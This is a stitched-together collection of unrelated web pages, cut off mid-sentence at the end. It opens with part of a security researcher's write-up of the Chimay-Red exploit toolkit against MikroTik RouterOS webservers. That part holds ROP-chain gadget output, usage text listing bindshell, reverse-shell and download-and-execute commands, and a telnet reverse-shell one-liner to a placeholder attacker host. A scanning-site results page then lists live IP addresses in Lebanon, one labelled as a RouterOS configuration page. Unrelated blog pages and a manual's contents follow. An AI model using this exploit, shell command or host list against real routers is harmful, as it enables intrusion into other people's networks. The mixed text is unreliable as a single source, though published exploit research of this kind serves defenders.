+First finds the address of a readable character for each character in the string "system\x00" and our desired command + "\x00" to be run by system().
+Next a writeable_segment_addr in the binary address ranges is searched for to be able to write x amount of characters to via strncpy(), (commonly the bss section is used) where x == len("system\x00"+command+"\x00")
+system_chunks character addresses are then written to the writeable_segment_addr using strncpy(), incrementing the writeable_segment_addr - char_pointer counter value each time a character is written.
+command_chunks character addresses are then written to (writeable_segment_addr + len("system\x00") + addr_size)
+dlsym() in the binary PLT entry table is then called with the target symbol being the original writeable_segment_addr which should be pointing to >
+"system\0"
+The result of the call to dlsym() now should be a pointer to the system() function. This pointer is returned in EAX and jumped to with a jmp eax gadget with its argument register (EBP) set to (writeable_segment_addr + len("system\x00") + addr_size) which should be pointing to > "ls -la\0"
+Produced gadgets:
+Writing "system\0":
+0x0000:
+strncpy strncpy(134594588, 134512899, 1)
+0x0004:
+0x805212e <adjust: pop esi; pop edi; pop ebp; ret>
+0x0008:
+0x805c01c arg0
+0x000c:
+0x8048103 arg1
+0x0010:
+0x1 arg2
+<snip>
+Writing "ls -la\0":
+0x008c:
+strncpy strncpy(134594604, 134512885, 1)
+0x0090:
+0x805212e <adjust: pop esi; pop edi; pop ebp; ret>
+0x0094:
+0x805c02c arg0
+0x0098:
+0x80480f5 arg1
+0x009c:
+0x1 arg2
+<snip>
+Calling dlsym() & jmp_eax():
+0x0118:
+dlsym dlsym(0, 134594588)
+0x011c:
+0x804ffd9 <adjust: pop ebx; pop ebp; ret>
+0x0120:
+0x0 arg0
+0x0124:
+0x805c01c arg1
+0x0128:
+jmp_eax jmp_eax(134594604)
+0x012c:
+b'zaad' <pad>
+0x0130:
+0x805c02c arg0
+Result:
+system("ls -la")
+Once the ROP chain has been built and packed for the given endianess, it can be sent during the payload stage as seen in the earlier procedure when abusing alloca(). Each gadget in the chain should be executed thanks to our return address overwrite earlier.
+MikroDB
+MikroDB is a sister application to Chimay-Red that allows easier portability and extendability of the exploit toolkit. its what allows hundreds of different types of ROP chains to be built without having access to the target binary itself; and it does this through a process like so:
+Enumerates all stable vulnerable RouterOS 6.x versions available for download from MK's archive for all architectures by bruteforcing version numbers via HEAD requests.
+Downloads all enumerated firmware images into a storage directory.
+Catalogs the filename and SHA256 hash of the firmware file into a local SQLite database file.
+Decompresses and extracts the webserver binary www from the SquashFS filesystem stored within NPK firmware image.
+Stores and catalogs the filename and SHA256 hash of the www webserver binary into the SQLite database file.
+For each webserver binary extracted, the file is ran through a ROP chain building process and information for building selected ROP-chain repeatably is stored in the SQLite database file.
+Once MikroDB is finished its process, it can be portably used with Chimay-Red to build ROP-chains on the fly thanks to the stored offsets in the database, instead of downloading and extracting and storing 5GB+ of FW images in-order to facilitate attacking any version and architecture. This 500KB database can be built once in only a couple hours and kept forever. For your convenience, a prebuilt database is included in the source code repository for this project!
+MikroDB was able to enumerate 352 vulnerable versions (as of writing this, it fluctuates oddly..) across all of their supported architectures, a table is represented below showing vulnerable versions available per architecture:
+Architecture
+# Vulnerable versions
+x86
+56
+ARM
+45
+POWERPC
+57
+SMIPS
+56
+MMIPS
+25
+MIPSBE
+57
+TILE
+56
+MikroDB in action against x86: (skip through)
+Wrapping it all together
+Usage:
+usage: chimay_red.py [-h] -t TARGET [-s] [-d] [--architecture ARCHITECTURE]
+[--gdbport GDBPORT] [--binary BINARY]
+[--shellcode SHELLCODE] [--vector VECTOR]
+[--leakrounds LEAKROUNDS] [-v] [--version]
+command
+positional arguments:
+command
+command function to run on target, see below for
+options
+optional arguments:
+-h, --help
+show this help message and exit
+-t TARGET, --target TARGET
+target address:port
+-l LHOST, --lhost LHOST
+local address to bind to for listening for connectback commands
+-s, --shell
+return interactive shell as main payload (default)
+-d, --debug
+enable debugging mode
+--architecture ARCHITECTURE
+target architecture (will detect automatically if
+target in route table range)
+--gdbport GDBPORT
+port to use when connecting to remote gdbserver
+--binary BINARY
+target binary (www)
+--shellcode SHELLCODE
+custom (optional) shellcode payload binary filepath
+--vector VECTOR
+optional vector type, see below for options
+--leakrounds LEAKROUNDS
+amount of rounds to leak pointers, higher is better,
+but takes more time
+-v, --verbose
+Verbosity mode
+--version
+show program's version number and exit
+commands:
+COMMAND
+FUNCTION
+bindshell
+create a bindshell
+connectback
+create a reverse shell
+download_and_exe
+connect back and download a file to then execute
+ssl_download_and_exe
+connect back and download a file via SSL to then execute
+write_devel
+write "devel-login" file to allow developer account login
+write_devel_read_userfile
+in addition to enabling developer logins, read back the users file
+custom_shellcode
+run arbitrary shellcode from `--shellcode` binfile
+custom_shell_command
+run a arbitrary $sh one liner on the target
+vectors:
+default: (mikrodb)
+[Generic]
+mikrodb:
+use the accompanying mikrodb database to load offsets
+based off of detected remote version to build a ROP chain.
+build:
+build a ROP chain from scratch given the www binary matching
+the remote version running.
+[Experimental]
+brute: bruteforce uclibc base offset.
+leak:
+leak pointers from shared libraries to give better odds of
+finding base offset of uclibc.
+examples:
+./chimay_red.py connectback --target 192.168.56.124:80 --lhost=192.168.56.1 --vector=mikrodb
+./chimay_red.py connectback -d --target 192.168.56.124:80 --lhost=192.168.56.1 --vector=build
+--binary $PWD/www --gdbport 4444
+==================================================
+|
+_______
+_
+___
+__|
+| / ___/ /
+(_)_ _
+___ ___ ______/ _ \___ ___/ /|
+|/ /__/ _ \/ /
+' \/ _ `/ // /___/ , _/ -_) _
+/ |
+|\___/_//_/_/_/_/_/\_,_/\_, /
+/_/|_|\__/\_,_/
+|
+|
+/___/
+|
+==================================================
+Additional tips & tricks
+Getting a reverse shell without existing telnet access for devel-login
+mknod /tmp/pipe p;telnet <attacker_ip> <attacker_port></tmp/pipe|bash>/tmp/pipe
+This command creates a READ|WRITE fifo-file pipe in memory using mknod and redirects the standard-in and out of bash to the pipe and out through telnet.
+Sending text to the LCD
+"echo hello world > /dev/lcd"
+image courtesy of BigNerd - Chimay-Red Github
+See it live!
+Chimay-Red in action:
+Chimay-Red in debug mode:
+Conclusions & Future Work
+So did I accomplish my goals in the end? Well almost.
+In the end I was able to exploit every stable release version for all architectures except TILE and ARM. Now you are probably wondering, "what the hell is TILE". It is for that specific reason why I was unable to support TILE. As for ARM, I have not had enough time to go through and test the ROP builder for ARM as of yet, but I hope to fully support the architecture soon.
+I was also unable to complete the command for custom_shellcode as I am not able to get a mprotect ROP-chain working for all architectures and versions.
+As for "Containerize and optionally emulate any system firmware for fuzzing and testing", I will be going over how to containerize and mass deploy swarms of RouterOS systems via Docker and libvirt in a later post so stay tuned :).
+Ideas that didn't work:
+I attempted to leak pointers from the heap by using a content-length of zero and sending small amounts of data into istream::read(). This resulted in some valid addresses being leaked from various areas of the process memory, although I was unable to use it in any way to predict ASLR offsets because of a lack of predictability in the leaked addresses. If the leaked addresses were in fact predictable in terms of their location in the process memory in correlation to the other threads and library load order on some systems it could possibly allow ROP chains to be crafted on the fly without the need of the target source webserver binary version.
+Chimay-Blue?
+Recently MK has fallen victim to an 0day against its Samba service within RouterOS: CVE-2018-7445, allowing for remote code execution. I hope to continue to build upon my existing Chimay-Red framework to integrate it. This should allow me to expand the 6.x exploit set past 6.38.5 and up to 6.41.2.
+Famous MK Forum Quotes:
+"Also, it seems that this exploit may not be functional in RouterOS version above v6.30.1"
+https://forum.mikrotik.com/viewtopic.php?f=21&t=119308&sid=ab6ad0f8565e550e36b99cb29e2e27da&start=50#p619740
+"After a thorough code review, we could not find anything hinting to the described issues."
+https://forum.mikrotik.com/viewtopic.php?f=21&t=119308&sid=ab6ad0f8565e550e36b99cb29e2e27da&start=50#p619740
+In the end, a span of approximately four years elapsed since the vulnerability was introduced until the time it was fixed. Four years should be enough for multiple competent code reviews to catch a blatant integer overflow in a critical function like reading user POST data. The fact this small issue was not discovered and fixed for so long, leads myself and I'm sure others to believe MK doesn't do code reviews or does not complete them often. If you are reading this MK, maybe stop custom writing and maintaining your: Webserver, Samba Server, RADIUS server, SSH server, TELNET server, FTP server, etc. Clearly you can't.
+References
+https://wikileaks.org/ciav7p1/cms/page_16384604.html
+https://wikileaks.org/ciav7p1/cms/page_16384512.html
+https://securelist.com/apt-slingshot/84312/
+Software Used
+Analysis:
+- IDA Pro
+- Binary Ninja
+- BinNavi
+Exploit:
+- pwntools
+- GDB
+- GDB PEDA
+- GEF
+- Binutils Collection
+Download
+Chimay-Red and MikroDB are freely available for download on GitHub:
+https://github.com/seekintoo/chimay-red
+About the Author
+Dayton Pidhirney is a Cybersecurity Researcher at Seekintoo. Dayton is an EE geek and is also Co-Founder of FirePick Services LLC., a maker-grade pick and place machine. Dayton's desk always has wires, screws, components and tools on it. Always. Seriously Dayton, clean your desk...
+Comments, concerns, and corrections are welcome and not triaged by any marketing machine we are aware of: dpidhirney (at) seekintoo (dot) com
+Categories
+arcsight
+careers
+ctf
+research
+Social
+twitter
+linkedin
+github
+© 2018 Seekintoo Ltd. and/or its affiliates.
+All rights reserved. Privacy PolicyFOFA Pro - 搜索结果
+问题反馈
+问题反馈关闭
+请详细描述您要反馈的内容
+请留下您的手机号或邮箱，方便我们与您联系(选填)
+验证码
+提交
+规则专题
+API&SDK
+规则列表
+Fofa客户端
+VIP会员
+切换导航
+规则列表
+规则专题
+企业版
+API&SDK
+客户端
+VIP会员
++1积分
+登录与注册
+×Close
+升级到普通会员以上级别用户就可以使用API了。
+https://fofa.so/api/v1/search/all?email=${YOUR_EMAIL}&key=${YOUR_KEY}&qbase64=Y2l0eT0iTmFiYXRpZWgi
+API帮助
+您还可以参考SDK,下载https://github.com/FOFAPRO
+输入错误，请输入正确再查询
+收藏规则
+下载数据
+使用API
+×Close
+Download
+文件正在导出，可在个人中心的下载记录查询文件状态
+数据文件会保存10天,10天后文件可能会被清除,请尽快下载。
+×关闭
+网站正文
+关闭
+正在加载统计信息......
+搜索 city="Nabatieh" 获得 249 条匹配结果 (独立IP数为
+条)， 用时 5 毫秒，模式: extended。
+默认只显示一年内的数据，点击 all 链接查看所有。
+← 上一页 1 2 3 4 5 6 7 … 25 下一页 →
+213.204.78.120
+83
+http
+213.204.78.120
+2019-06-27
+Lebanon
+/
+Nabatieh
+ASN:
+39010
+组织:
+TerraNet sal
+HTTP/1.0 200 OK
+Connection: close
+Content-Length: 7065
+Content-Type: text/html
+Date: Thu, 27 Jun 2019 08:23:09 GMT
+Expires: 0
+213.204.78.115
+83
+http
+213.204.78.115
+2019-06-27
+Lebanon
+/
+Nabatieh
+ASN:
+39010
+组织:
+TerraNet sal
+HTTP/1.0 200 OK
+Connection: close
+Content-Length: 7065
+Content-Type: text/html
+Date: Thu, 27 Jun 2019 08:21:09 GMT
+Expires: 0
+213.204.78.114
+83
+http
+213.204.78.114
+2019-06-27
+Lebanon
+/
+Nabatieh
+ASN:
+39010
+组织:
+TerraNet sal
+HTTP/1.0 200 OK
+Connection: close
+Content-Length: 7065
+Content-Type: text/html
+Date: Thu, 27 Jun 2019 08:17:50 GMT
+Expires: 0
+213.204.78.118
+83
+http
+213.204.78.118
+2019-06-27
+Lebanon
+/
+Nabatieh
+ASN:
+39010
+组织:
+TerraNet sal
+HTTP/1.0 200 OK
+Connection: close
+Content-Length: 7065
+Content-Type: text/html
+Date: Thu, 27 Jun 2019 08:13:11 GMT
+Expires: 0
+213.204.78.119
+83
+http
+213.204.78.119
+2019-06-27
+Lebanon
+/
+Nabatieh
+ASN:
+39010
+组织:
+TerraNet sal
+HTTP/1.0 200 OK
+Connection: close
+Content-Length: 7065
+Content-Type: text/html
+Date: Thu, 27 Jun 2019 08:09:00 GMT
+Expires: 0
+213.204.78.186
+80
+http
+213.204.78.186
+2019-06-27
+Lebanon
+/
+Nabatieh
+ASN:
+39010
+组织:
+TerraNet sal
+HTTP/1.0 200 OK
+Connection: close
+Content-Length: 7065
+Content-Type: text/html
+Date: Thu, 27 Jun 2019 05:50:49 GMT
+Expires: 0
+213.204.78.116
+83
+http
+213.204.78.116
+2019-06-27
+Lebanon
+/
+Nabatieh
+ASN:
+39010
+组织:
+TerraNet sal
+HTTP/1.0 200 OK
+Connection: close
+Content-Length: 7065
+Content-Type: text/html
+Date: Thu, 27 Jun 2019 05:46:13 GMT
+Expires: 0
+213.204.78.116:83
+83
+RouterOS router configuration page
+213.204.78.116
+2019-06-27
+Lebanon
+/
+Nabatieh
+ASN:
+39010
+组织:
+TerraNet sal
+HTTP/1.1 200 OK
+Connection: close
+Content-Length: 7065
+Content-Type: text/html
+Date: Thu, 27 Jun 2019 05:46:15 GMT
+Expires: 0
+213.204.78.121
+83
+http
+213.204.78.121
+2019-06-27
+Lebanon
+/
+Nabatieh
+ASN:
+39010
+组织:
+TerraNet sal
+HTTP/1.0 200 OK
+Connection: close
+Content-Length: 7065
+Content-Type: text/html
+Date: Thu, 27 Jun 2019 04:12:10 GMT
+Expires: 0
+213.204.78.117
+83
+http
+213.204.78.117
+2019-06-27
+Lebanon
+/
+Nabatieh
+ASN:
+39010
+组织:
+TerraNet sal
+HTTP/1.0 200 OK
+Connection: close
+Content-Length: 7065
+Content-Type: text/html
+Date: Thu, 27 Jun 2019 03:51:23 GMT
+Expires: 0
+← 上一页 1 2 3 4 5 6 7 … 25 下一页 →
+下载所有图片
+正在加载图标信息......
+×Close
+升级到普通会员以上级别用户就可以使用API了。
+https://fofa.so/api/v1/search/all?email=${YOUR_EMAIL}&key=${YOUR_KEY}&qbase64=Y2l0eT0iTmFiYXRpZWgi
+API帮助
+您还可以参考SDK,下载https://github.com/FOFAPRO
+白帽汇
+服务热线：400-650-2031
+联系邮箱：service@baimaohui.net
+地址：北京市朝阳区东三环北路天元港B座10层
+产品
+企业版>
+NOSEC
+FOEYE
+BCSEC
+信息
+关于我们
+帮助文档
+English
+&nbsp &nbsp 简体中文
+zh-CN
+版权所有 © 白帽汇 2015 - 2019. All Rights Reserved 粤ICP备16088626号. Version 3.4.272DSA key login and command execution via SSH on RouterOS | BLOG.BRAVI.ORG
+Home
+Article List
+Disclaimer
+PGP
+Privacy & Cookies
+The Author
+The Site
+BLOG.BRAVI.ORG
+Another (NOT Useless) BLOG OnLine.
+DSA key login and command execution via SSH on RouterOS
+Since RouterOS 2.9.13 the support for SSH DSA keys and command execution via ssh connection is available.
+This allows admins to run commands and scripts from a remote machine on a RouterOS equipped one without inserting interactively a password to authenticate (Public/Private Key Authentication).
+To use this facility, only three configuration steps are necessary.
+First step is to create a key using ssh-keygen.
+ssh-keygen -t dsassh-keygen -t dsa
+To Login in the remote machine without being prompted for key PassPhrase, it is possible to:
+1. Leave passphrase blank during creation.
+2. Use OpenSSL Toolkit to remove PassPhrase.
+3. Use a local SSH-Agent to manage Key Authentication & Forwarding (RECOMMENDED)
+Second step is upload via FTP the id_dsa.pub Key (Public Key) into the RouterOS device.
+ftp mk.lab.bravi.orgftp mk.lab.bravi.org
+Connected to mk.lab.bravi.org.
+220 mk.lab.bravi.org FTP server (MikroTik 4.17) ready
+Name (mk.lab.bravi.org:admin): admin
+331 Password required for admin
+Password:
+230 User admin logged in
+Remote system type is UNIX.
+ftp> put id_dsa.pub
+local: id_dsa.pub remote: id_dsa.pub
+227 Entering Passive Mode (XXX,XXX,XXX,XXX,XXX,XX).
+150 Opening ASCII mode data connection for '/id_dsa.pub'
+100% |******| 613 8.23 MiB/s --:-- ETA226 ASCII transfer complete
+613 bytes sent in 00:00 (76.83 KiB/s)
+ftp> exitConnected to mk.lab.bravi.org.
+220 mk.lab.bravi.org FTP server (MikroTik 4.17) ready
+Name (mk.lab.bravi.org:admin): admin
+331 Password required for admin
+Password:
+230 User admin logged in
+Remote system type is UNIX.
+ftp> put id_dsa.pub
+local: id_dsa.pub remote: id_dsa.pub
+227 Entering Passive Mode (XXX,XXX,XXX,XXX,XXX,XX).
+150 Opening ASCII mode data connection for '/id_dsa.pub'
+100% |******| 613 8.23 MiB/s --:-- ETA226 ASCII transfer complete
+613 bytes sent in 00:00 (76.83 KiB/s)
+ftp> exit
+Third and last step is import the key in RouterOS Terminal (also possible using Winbox Client).
+/user ssh-keys import file=id_dsa.pub user=admin/user ssh-keys import file=id_dsa.pub user=admin
+The user field determines which user account will be authenticated when using the specific Key.
+By authenticating with the Public/Private Key, the process of sending commands to devices will be drastically simplified, for example in my old RB500 used in LAB:
+ssh admin@mk.lab.bravi.org "/system resource print"ssh admin@mk.lab.bravi.org "/system resource print"
+The immediate reply will be:
+uptime: 5d17h7m59s
+version: "4.17"
+free-memory: 47960kB
+total-memory: 62440kB
+cpu: "MIPS 4Kc V0.10"
+cpu-count: 1
+cpu-frequency: 399MHz
+cpu-load: 4
+free-hdd-space: 85420kB
+total-hdd-space: 126976kB
+write-sect-since-reboot: 1263
+write-sect-total: 31632
+bad-blocks: 0.1%
+architecture-name: "mipsle"
+board-name: "RB532A"
+platform: "MikroTik" uptime: 5d17h7m59s
+version: "4.17"
+free-memory: 47960kB
+total-memory: 62440kB
+cpu: "MIPS 4Kc V0.10"
+cpu-count: 1
+cpu-frequency: 399MHz
+cpu-load: 4
+free-hdd-space: 85420kB
+total-hdd-space: 126976kB
+write-sect-since-reboot: 1263
+write-sect-total: 31632
+bad-blocks: 0.1%
+architecture-name: "mipsle"
+board-name: "RB532A"
+platform: "MikroTik"
+Tags: DSA, Key, Private Key, Public Key, RouterOS, SSH
+This entry was posted on Wednesday, May 18th, 2011 at 11:24 PMand is filed under . You can follow any responses to this entry through the RSS 2.0 feed.
+Both comments and pings are currently closed.
+Comments are closed.
+Client IP DetectorYou reach us in IPv4, your IP is:110.93.234.9IPv6: 2.15% - IPv4: 97.85%
+Latest Posts
+mail Command in Shell Scripting
+Remove / Uninstall packages marked ‘rc’ on Debian / Ubuntu.
+Bash Completion in OsX.
+ProFTPD killed with signal 15 on restart: QuickFix on Ubuntu.
+Big partitions in Linux (> 2TB).
+Random Posts
+Arpwatch setup in Ubuntu
+November 2, 2011
+Stream Mikrotik RouterOS Sniffer TZSP directly to a remote WireShark host.
+September 2, 2012
+Semi-Quick KVM Virtualization using libvirt
+May 7, 2011
+Post Categories
+Apple World (10)
+Cisco World (6)
+Cryptography (3)
+DataBase Management (4)
+Flight (2)
+General IT Topics (7)
+Juniper World (7)
+Linux Administration (56)
+Magento (1)
+Mikrotik World (9)
+Networking Resources (42)
+News (5)
+Programming (15)
+Security (22)
+Virtualization (6)
+WordPress (4)
+Flight Resources
+World Flight Planner
+Networking Resources
+IOS Hints
+Mikrotik WiKi
+Routing-Bits
+WordPress Plugins
+Aviation Weather Widget
+Client IP Detector
+Subscribe RSS
+Copyright © 2011 blog.bravi.org
+WordPress theme originally written by Michael Tyson and customized by me..
+This website uses cookies to work. By continue using this website (scrolling page or clicking buttons or links) we'll assume you're ok with this. Yyou can opt-out if you wish. Accept Read MoreMikrotik Manual Full | Proxy Server | Ip Address
+SearchSearchClose suggestionsUploadenChange LanguageSign InJoinHomeSavedBestsellersBooksAudiobooksSnapshotsMagazinesDocumentsSheet MusicUploadEnglishRead Free For 30 DaysSign In23K views10Up votes, mark as useful1Down votes, mark as not usefulMikrotik Manual FullUploaded by offline71Mikrotik
+Contents
+Mikrotik Manual:Customizing Hotspot Manual:IP/Hotspot/User Manual:IP/Hotspot/Walled Garden Manual:Simple TE Manual:API User:Boen robot/API Manual:IP/Address Manual:IP/ARP M…Full descriptionCopyright: Attribution Non-Commercial (BY-NC)Download as PDF, TXT or read online from ScribdFlag for inappropriate contentsaveSave Mikrotik Manual Full For LaterInfoInfoEmbedEmbedShareSharePrintPrintDownloadJump to Page You are on page 1of 1074Search inside document
+Contents
+Articles
+Manual:Customizing Hotspot 1Manual:IP/Hotspot/User 12Manual:IP/Hotspot/Walled Garden 15Manual:Simple TE 17Manual:API 25User:Boen robot/API 39Manual:IP/Address 52Manual:IP/ARP 54Manual:IPv6/Address 58Manual:Router AAA 65Manual:BGP based VPLS 71Manual:BGP Best Path Selection Algorithm 78Manual:BGP Case Studies 79Manual:BGP HowTo & FAQ 86Manual:BGP Load Balancing with two interfaces 91Manual:BGP nexthop selection and validation in RouterOS 3.x 94Manual:BGP soft reconfiguration alternatives in RouterOS 97Manual:EBGP as PE-CE routing protocol 99Manual:EoMPLS vs Cisco 105Manual:Interface/Bonding 109Manual:Interface/Bridge 117Manual:MPLS L2VPN vs Juniper 126Manual:Routing/BFD 137Manual:Routing/BGP 140Manual:Simple BGP Multihoming 147Manual:BCP bridging (PPP tunnel bridging) 150Manual:Bonding Examples 158Manual:Bootloader upgrade 160Manual:Console 161Manual:Create Certificates 169Manual:System/Certificates 171Manual:CD Install 176Manual:Configuration Management 182Manual:Conformance Testing Mode 187
+Manual:IP/Firewall/Connection tracking 187Manual:Connection Rate 190Manual:Console login process 193Manual:CPU Usage 197Manual:Default Configurations 198Manual:IP/DHCP Client 203Manual:IP/DHCP Relay 205Manual:IP/DHCP Server 208Manual:IP/DNS 215Manual:Tools/Dynamic DNS 219Manual:IPv6/DHCP Client 220Manual:IPv6/DHCP Server 224Manual:Interface/EoIP 227Manual:Interface/Ethernet 231Manual:Interface/Gre 235Manual:Interface/Gre6 237Manual:Tools/email 238Manual:Tools/Ping 240Manual:Routing/Routing filters 242Manual:Tools/Fetch 245Manual:Fast Path 247Fast Path spanish 248Manual:IP/Firewall 250Manual:IPv6/Firewall 250Manual:IP/Firewall/Address list 251Manual:IP/Firewall/Filter 252Manual:IPv6/Firewall/Filter 260Manual:IP/Firewall/L7 261Manual:IP/Firewall/Mangle 263Manual:IP/Firewall/NAT 269Manual:First time startup 275Manual:Flashfig 279Manual:FTP server 285Manual:System/GPS 286Manual:Tools/Graphing 288Manual:Grounding 292Manual:Hotspot Introduction 295Manual:System/Health 299
+Manual:IP/Hotspot 300Manual:HTB 304Manual:Interface/HWMPplus 313Manual:Creating IPv6 loopback address 325Manual:Interface 326Manual:Interface/IPIP 328Manual:IP 330Manual:IPv6 330Manual:IPv6 Overview 330Manual:OSPFv3 with Quagga 335Manual:Routing/IGMP-Proxy 338Manual:Tools/IP-Scan 341Manual:Initial Configuration 342Manual:Internet access from VRF 364Manual:Internet access from VRF with NAT 365Manual:IP/Hotspot/Profile 368Manual:IP/IPsec 371Manual:IPv6/Firewall/Address-list 387Manual:IPv6/Firewall/Mangle 387Manual:IPv6/ND 387Manual:IPv6/Neighbors 392Manual:IPv6/Route 393Manual:KVM 396Manual:Entering a RouterOS License key 405Manual:Interface/L2TP 408Manual:License 414Manual:Lua 420Manual:System/LEDS 422Manual:System/Log 423Manual:System/UPS 430Manual:Layer-3 MPLS VPN example 434Manual:LCD TouchScreen 439Manual:Limiting maximum number of prefixes accepted 441Manual:Load balancing multiple same subnet links 442MAC access 445Manual:Making a simple wireless AP 448Manual:Maximum Transmission Unit on RouterBoards 451Manual:Metarouter 457
+Share this documentShare or Embed DocumentSharing OptionsShare on Facebook, opens a new windowShare on Twitter, opens a new windowShare on LinkedIn, opens a new windowShare with Email, opens mail clientCopy TextRelated InterestsProxy ServerIp AddressPort (Computer Networking)RadiusHypertext Transfer ProtocolFooter MenuBack To TopAboutAbout ScribdPressOur blogJoin our team!Contact UsJoin todayInvite FriendsGiftsSupportHelp / FAQAccessibilityPurchase helpAdChoicesPublishersLegalTermsPrivacyCopyrightSocial MediaCopyright © 2019
+Scribd Inc.Browse BooksSite DirectorySite Language:EnglishChange LanguageEnglishChange Language
+576648e32a3d8b82ca71961b7a986505job | vcloudnine.de
+vcloudnine.de… virtualization on cloud 9 Menu Skip to contentHomeAboutSupport and DonationsPartnerVembuImprintPrivacy Policy Tag Archives: job Exam prep & experience: Citrix NetScaler Advanced Topics: Security, Management, and Optimization (1Y0-340) Leave a replyIn May 2018, Citrix released their new Citrix Certified Expert – Networking certification, which completet the networking certification path at the upper end (blog post on training.citrix.com). The track starts with the Associate (CCA-N), the lower-level certification is a requirement for achieving the higher-level certification, continues with the Professional (CCP-N), and ends with the Expert (CCE-N) certification. This is pretty cool, and I’m very happy that Citrix now offers the CCE-N, because the expert-level certification was missing all the time.kmicican/ pixabay.com/ Creative Commons CC0Everything is cool… except you have passed exam 1Y0-351 to gain your CCP-N. In this case, you have to pass 1Y0-340 until Dec 31 2018. Otherwise you have to start with the CCA-N, after the validity period of your CCP-N is over (3y after passing the exam).Bad move, Citrix, bad move. I’m really disappointed. I passed 1Y0-351 in Nov 2017, and now, 12 months later, I have to book, pay, and pass 1Y0-340 if I not want to start with a CCA-N in Nov 2020. Bad move, Citrix, bad move!Exam 1Y0-340 is titled as “Citrix NetScaler Advanced Topics: Security, Management, and Optimization”, where as 1Y0-351 was titeld as “Citrix NetScaler 10.5 Essentials and Networking”. You can assume that more in-depth knowledge is needed to pass the exam, as it was necessary for 1Y0-351. Note the “Advanced Topics” in the exam title.But what are these “advanced topics”?  According to the exam prep guide, the perfect candidate for the 1Y0-340 exam can deploy and/or manageCitrix NetScaler Application Firewall (AppFirewall) to secure application access in a Citrix NetScaler 12 environment, as well asNetScaler Management and Analytics System (NMAS) to administer a Citrix NetScaler environment, orOptimize NetScaler-managed application delivery trafficCitrix NetScaler Application Firewall (AppFirewall)You should take an in-depth look at these topics:Application Firewall OverviewApplication Firewall Profiles and PoliciesRegular ExpressionAttacks and ProtectionsMonitoring and TroubleshootingSecurity and FilteringNetScaler Management and Analytics System (NMAS)NetScaler MAS: Introduction and ConfigurationManaging and Monitoring NetScaler InstancesManaging NetScaler ConfigurationsNetScaler Web LoggingOptimize NetScaler-managed application delivery trafficIntegrated CachingFront-End OptimizationTuning and OptimizationsHow to prep?The exam prep guide referres to the NetScaler documentation, as also to training material. Unfortunately I don’t have access to the newer training material, only to the training material from my CNS-220 course. But hey: At least we have tons of publically available NetScaler 12.0 documentation available!The exam prep guide has a section in which Citrix outlines sections, objectives and references. You will find links to the NetScaler 12.0 documentation, as well as knowledge base articles, or blog posts. Go through it. Read it carefully!The exam prep guide also outlines the section titles and weights. Two areas stand out:Section 4: Attacks and Protections, andSection 8: Managing and Monitoring NetScaler InstancesThe section weights are directly map to the number of questions in the exam. If the exam has 60 questions, and section 4 has a weight of 21%, at least 12 questions will relate to “Attacks and Protections”.How did it go?First things first: I passed with a good score. The exam had 62 questions and I needed at least 62% to pass the exam. I passed with 82%. As a non-native English speaker that took the exam in a country where english is a foreign language, I got 30 minutes extra, resulting in 120 minutes for 62 questions. Plenty of time…What should I say? It was a multiple choice test. Read the questions carefully. The exam guide did not lie to me. It came pretty close to the topics that were described in the guide. For most questions, my first “educated guess” was right. Sometimes, the least dumb answer seemed to be correct. ;)It was a bit frustrating that Citrix has changed product names. NetScaler is no “Application Delivery Controller”, MAS is now known as “Citrix Application Delivery Management”. There was a button which showed a mapping table “old name – new name”.If you are experienced with Citrix ADC deployments and configuration, I think the exam prep guide is enough to pass the exam.Good luck! This entry was posted in Job, Security, Software and tagged certification, citrix, job, netscaler, security on November 30, 2018 by Patrick Terlisten. What is in the bag? Leave a replyMichael White published the third release of his “What is in the bag” blog post. In reference to this, I would like to share the content of my bag.I used a RIMOWA Salsa business trolley for several years. Unfortunately, it broke in June 2017 and a repair was refused by RIMOWA. I was very disappointed of the product quality and the customer service experience with RIMOWA.I decided to switch to a backpack, which felt much more comfortable than carrying or pulling the RIMOWA trolley.Since November 2017, I’m using an Eastpak Floid Ash Blend2. It is a small backpack, with just enough space for my equipment. The whole backpack, with all its content, weighs about 4 kg.Patrick Terlisten/ www.vcloudnine.de/ Creative Commons CC0When I’m on the road, a Lenovo ThinkPad T480s is my primary working device. It has a 14″ WQHD display, 16 GB RAM, and a 512 GB nVME SSD. It is running Windows 10 and the 3 cell battery with 57 Wh capacity allows me to work 8 to 12 hours without a power supply.Patrick Terlisten/ www.vcloudnine.de/ Creative Commons CC0I really take care of my devices. Because of this, my ThinkPad is stored in a CAISON 14 inch sleeve, when it is no used.I also use an Lenovo ThinkPad X250 as fallback or during projects, when I need a more smaller device (e.g. doing networking stuff at a datacenter). But this laptop isn’t in my backpack. :)My X250 is also carried in a sleeve, if it is no used.Of course, I carry a few accessories around with me. They are safely stored in a BUBM bag.Patrick Terlisten/ www.vcloudnine.de/ Creative Commons CC0First, there are a lot of small things in it:2x Trancend 64 GB USB 3 SticksPatriot 8 GB USB StickIntenso 8 GB USB Stick16 GB MicroSD CardDELL 10W AC Adapter with USB Outlet2m CAT 6 Cable0,5m CAT 6 CableLightning to USB CableMicro-USB to USB CableApple EarPods with 3.5 mm Headphone PlugIn addition to that:An external HDD for software and backups. I use a Transcend StoreJet M3S 1 TB USB 3 HDD drive. It has a USB 3.1 Gen 1 interface and it is Military-grade shock resistant. This makes it a perfect fit for me. It stores all the software I possibly need during my work (several releases of VMware vSphere vCenter, ESXi, Windows Server, Veeam Backup & Replication, HPE Support Pack for ProLiant etc), as well as my Veeam Agent backups. Of course, the hard drive is encrypted. :)Patrick Terlisten/ www.vcloudnine.de/ Creative Commons CC0Both laptops have an Ethernet port. Nevertheless I’m a WiFi fan. The MikroTik hAP ac² is primarily used as a WiFi-to-Ethernet bridge. If necessary, I can hook devices to the additional four switch ports (10/ 100/ 1000 Mbit). The switch can do much more, but in my case, it is primarily… a bridge. A very nice feature is the PoE-In capability. I have the power supply with me, but most times I power it with PoE.Patrick Terlisten/ www.vcloudnine.de/ Creative Commons CC0The MikroTik hAP² offers PoE-In, but only passive PoE. So I need a 802.3af to passive PoE converter. I use this 802.3af PoE converter from Ubiquiti.Patrick Terlisten/ www.vcloudnine.de/ Creative Commons CC0The ThinkPad trackpad is good, but sometimes a wireless mouse is better. I use a Logitech M185 wireless mouse. Pretty solid, nothing much to say about it. :)Patrick Terlisten/ www.vcloudnine.de/ Creative Commons CC0Another Logitech device is my Logitech R400 Laser presentation remote. I had it multiple times the situation, that such a device was not available during presentations, so I decided to buy my own remote.Patrick Terlisten/ www.vcloudnine.de/ Creative Commons CC0Another important device for customer presentations: My Lenovo USB-C Travel Hub. It offers, beside a USB 3 and a GbE RJ45 